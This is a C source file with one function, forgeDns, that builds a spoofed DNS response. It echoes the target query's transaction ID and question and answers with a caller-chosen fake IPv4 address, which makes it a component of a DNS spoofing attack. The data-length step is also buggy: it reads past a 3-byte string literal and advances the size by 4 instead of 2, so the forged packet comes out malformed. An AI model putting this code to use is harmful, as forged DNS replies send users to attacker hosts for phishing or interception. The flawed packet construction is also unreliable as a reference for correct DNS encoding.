#include "dns.h"

#include <arpa/inet.h>
#include <string.h>

int forgeDns(const dnshdr *dnsHeader, const struct in_addr *fakeAddr, unsigned char *output) {
    int size;
    unsigned char *query = (unsigned char *)((unsigned char *)dnsHeader + sizeof(dnshdr));

    ((dnshdr *)output)->id = dnsHeader->id;
    ((dnshdr *)output)->qcount = htons(1);
    ((dnshdr *)output)->ancount = htons(1);
    ((dnshdr *)output)->nscount = htons(0);
    ((dnshdr *)output)->adcount = htons(0);
    // flags
    output[2] = 0x81;
    output[3] = 0x80;

    // first get the total size of the query, name + class + type
    for (size = 0; query[size] != 0; size++) ;
    // set the correct total size of the query
    // 2 for type, 2 for class, 1 for null byte
    size+= 2 + 2 + 1;

    // copy the query to the output
    memcpy(output + sizeof(dnshdr), query, size);

    // set the correct total size
    size += sizeof(dnshdr);

    // create the dns answer
    // pointer to q name
    memcpy(output + size, "\xc0\x0c", 2);
    size += 2;
    // type
    memcpy(output + size, "\x00\x01", 2);
    size += 2;
    // class
    memcpy(output + size, "\x00\x01", 2);
    size += 2;
    // TTL
    memcpy(output + size, "\x00\x00\x00\x22", 4);
    size += 4;
    // data length
    memcpy(output + size, "\x00\x04", 4);
    size += 4;
    // data
    memcpy(output + size, fakeAddr, 4);
    size += 4;

    return size;
}
